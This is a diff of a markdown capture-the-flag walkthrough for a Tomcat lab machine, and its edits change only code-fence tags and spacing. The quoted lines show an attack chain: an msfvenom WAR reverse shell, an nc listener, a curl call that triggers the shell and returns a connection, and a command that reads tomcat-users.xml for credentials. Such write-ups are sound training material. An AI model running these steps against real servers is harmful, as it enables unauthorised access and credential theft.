@@ -50,7 +50,7 @@ Transfer-Encoding: chunked
 Date: Sun, 15 Aug 2021 01:28:24 GMT
 ```
 
-With _**whatweb**_ we can identify multiple web technologies:
+With _**whatweb **_we can identify multiple web technologies:
 
 ```bash
 ❯ whatweb -a 3 -v http://10.10.10.95:8080
@@ -197,7 +197,7 @@ I’ll use msfvenom to create a windows reverse shell that can be caught with nc
 
 I’ll also need to know the name of the JSP page to activate it with curl. I’ll use jar to list the contents of the war.
 
-```text
+```
 ❯ jar -ft rev_shell-9002.war
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 META-INF/
@@ -211,7 +211,7 @@ qduissimtg.jsp
 
 I'll set up a listener with nc:
 
-```text
+```
 ❯ nc -lvnp 9002
 ```
 
@@ -221,13 +221,13 @@ Now upload through the manager application:
 
 Then curl the page at:
 
-```text
+```
 ❯ curl http://10.10.10.95:8080/rev_shell-9002/qduissimtg.jsp
 ```
 
 We receive a reverse shell:
 
-```text
+```
 ❯ nc -lvnp 9002
 listening on [any] 9002 ...
 connect to [10.10.16.185] from (UNKNOWN) [10.10.10.95] 49192
@@ -275,7 +275,6 @@ fg %1
 
 The default tomcat credentials location is the following:
 
-```text
+```
 cat /usr/share/tomcat*/conf/tomcat-users.xml
 ```
-
